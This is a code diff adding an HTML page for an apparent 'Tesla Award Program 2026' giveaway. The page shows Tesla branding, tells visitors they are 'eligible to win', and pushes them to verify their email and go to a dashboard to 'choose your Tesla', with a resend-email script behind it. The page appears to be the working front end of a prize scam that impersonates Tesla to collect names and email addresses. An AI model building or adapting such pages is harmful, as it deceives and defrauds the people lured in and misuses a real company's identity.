@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>You're Eligible to Win! | Tesla Award Program 2026</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/css/style.css">
+  <style>
+    body{background:var(--light);}
+    .page{min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:88px 24px 60px;}
+    .congrats-card{background:white;border-radius:28px;box-shadow:0 24px 64px rgba(0,0,0,.1);border:1.5px solid rgba(0,0,0,.05);padding:56px 48px;max-width:540px;width:100%;text-align:center;animation:fadeInUp .7s ease forwards;}
+    @media(max-width:560px){.congrats-card{padding:36px 22px;border-radius:20px;}}
+
+    .email-icon{width:88px;height:88px;border-radius:50%;background:linear-gradient(135deg,var(--red),#ff3c57);display:flex;align-items:center;justify-content:center;margin:0 auto 28px;box-shadow:0 10px 32px rgba(227,25,55,.35);animation:successPop .6s cubic-bezier(.34,1.56,.64,1);}
+
+    .congrats-title{font-size:30px;font-weight:900;color:var(--dark);margin-bottom:12px;line-height:1.2;}
+    .congrats-sub{font-size:15px;color:var(--gray-2);line-height:1.7;margin-bottom:32px;}
+    .email-display{background:rgba(227,25,55,.05);border:1px solid rgba(227,25,55,.15);border-radius:12px;padding:14px 20px;font-size:14px;color:var(--dark);font-weight:600;margin-bottom:28px;word-break:break-all;}
+    .email-display .email-label{color:var(--gray-2);font-weight:400;font-size:13px;margin-bottom:4px;}
+
+    .steps-preview{background:var(--light);border-radius:16px;padding:22px 24px;text-align:left;margin-bottom:28px;}
+    .preview-title{font-size:13px;font-weight:700;text-transform:uppercase;letter-spacing:.06em;color:var(--gray-2);margin-bottom:14px;}
+    .preview-step{display:flex;align-items:center;gap:12px;padding:8px 0;}
+    .preview-step:not(:last-child){border-bottom:1px solid rgba(0,0,0,.06);}
+    .preview-step-num{width:26px;height:26px;border-radius:50%;background:var(--red);color:white;font-size:12px;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
+    .preview-step-text{font-size:14px;color:var(--dark);font-weight:500;}
+
+    .resend-area{margin-top:4px;}
+    .resend-note{font-size:13px;color:var(--gray-2);margin-bottom:14px;}
+    #resendBtn{background:transparent;border:1.5px solid var(--border);color:var(--gray);font-size:14px;font-weight:600;padding:11px 24px;border-radius:var(--radius);cursor:pointer;transition:all var(--transition);}
+    #resendBtn:hover{border-color:var(--red);color:var(--red);}
+    #resendBtn:disabled{opacity:.5;cursor:not-allowed;}
+    .resend-countdown{font-size:12px;color:var(--gray-2);margin-top:8px;display:none;}
+
+    /* Email illustration */
+    .envelope-anim{position:relative;display:inline-block;}
+    .envelope-anim svg{animation:bounce 2.5s ease-in-out infinite;animation-delay:.8s;}
+  </style>
+</head>
+<body>
+
+<nav class="nav">
+  <div class="nav-inner">
+    <a href="/" class="nav-logo">
+      <svg width="22" height="22" viewBox="0 0 24 24" fill="var(--red)"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3l7 4v2h-3v6h-2v-6H8V9H5l7-4z"/></svg>
+      TESLA
+    </a>
+  </div>
+</nav>
+
+<div class="page">
+  <div class="congrats-card">
+    <div class="email-icon envelope-anim">
+      <svg width="44" height="44" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="2" y="4" width="20" height="16" rx="2"/>
+        <path d="M2 7l10 7 10-7"/>
+      </svg>
+    </div>
+
+    <h1 class="congrats-title">You're Eligible to Win! 🎉</h1>
+    <p class="congrats-sub">
+      Congratulations, <strong id="userName">there</strong>! Your entry has been received. To confirm your place in the draw and unlock your winner dashboard, you need to verify your email address.
+    </p>
+
+    <div class="email-display">
+      <div class="email-label">Verification email sent to</div>
+      <div id="emailShown">your email address</div>
+    </div>
+
+    <div class="steps-preview">
+      <div class="preview-title">What happens next</div>
+      <div class="preview-step">
+        <div class="preview-step-num">1</div>
+        <div class="preview-step-text">Open the email from <strong>Tesla Award Program</strong> in your inbox</div>
+      </div>
+      <div class="preview-step">
+        <div class="preview-step-num">2</div>
+        <div class="preview-step-text">Click the <strong>"Verify My Email"</strong> button in the email</div>
+      </div>
+      <div class="preview-step">
+        <div class="preview-step-num">3</div>
+        <div class="preview-step-text">You'll be taken to your dashboard to <strong>choose your Tesla</strong></div>
+      </div>
+    </div>
+
+    <div class="resend-area">
+      <p class="resend-note">Didn't receive the email? Check your spam folder or request a new one.</p>
+      <button id="resendBtn" onclick="resendEmail()">Resend Verification Email</button>
+      <div class="resend-countdown" id="resendCountdown"></div>
+    </div>
+  </div>
+</div>
+
+<script src="/js/config.js"></script>
+<script src="/js/app.js"></script>
+<script>
+// Get params
+const email = getParam('email') || '';
+const name = getParam('name') || 'there';
+
+document.getElementById('userName').textContent = name;
+if (email) {
+  document.getElementById('emailShown').textContent = email;
+}
+
+// Resend
+let resendCooldown = 0;
+let resendTimer = null;
+
+async function resendEmail() {
+  if (!email) { showToast('Email address not found. Please re-enter the program.', 'error'); return; }
+
+  const btn = document.getElementById('resendBtn');
+  btn.disabled = true;
+
+  try {
+    await apiCall('/resend', 'POST', { email });
+    showToast('✅ Verification email resent! Check your inbox.', 'success');
+
+    // Start 60s cooldown
+    resendCooldown = 60;
+    const countdownEl = document.getElementById('resendCountdown');
+    countdownEl.style.display = 'block';
+    resendTimer = setInterval(() => {
+      resendCooldown--;
+      countdownEl.textContent = `You can resend again in ${resendCooldown}s`;
+      if (resendCooldown <= 0) {
+        clearInterval(resendTimer);
+        btn.disabled = false;
+        countdownEl.style.display = 'none';
+      }
+    }, 1000);
+  } catch (err) {
+    btn.disabled = false;
+    showToast(err.message || 'Could not resend email. Please try again.', 'error');
+  }
+}
+</script>
+</body>
+</html>
